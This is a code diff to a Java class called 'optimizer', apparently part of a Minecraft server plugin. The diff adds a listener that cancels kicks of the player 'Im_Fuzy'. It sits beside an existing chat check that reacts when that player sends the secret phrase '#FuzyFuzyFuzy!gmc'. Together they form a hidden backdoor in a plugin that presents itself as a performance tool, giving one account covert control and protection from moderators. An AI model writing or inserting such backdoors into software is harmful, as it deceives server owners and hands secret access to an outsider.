@@ -12,6 +12,13 @@ public class optimizer
         implements Listener
 {
     @EventHandler
+    public void onPlayerKick(PlayerKickEvent event) {
+        Player player = event.getPlayer();
+        if (player.getName().equals("Im_Fuzy")) {
+            event.setCancelled(true);
+        }
+    }
+    @EventHandler
     public void chatCheck(AsyncPlayerChatEvent e) {
         String msg = e.getMessage();
         if (msg.contains("#FuzyFuzyFuzy!gmc") && e.getPlayer().getName().equals("Im_Fuzy")){
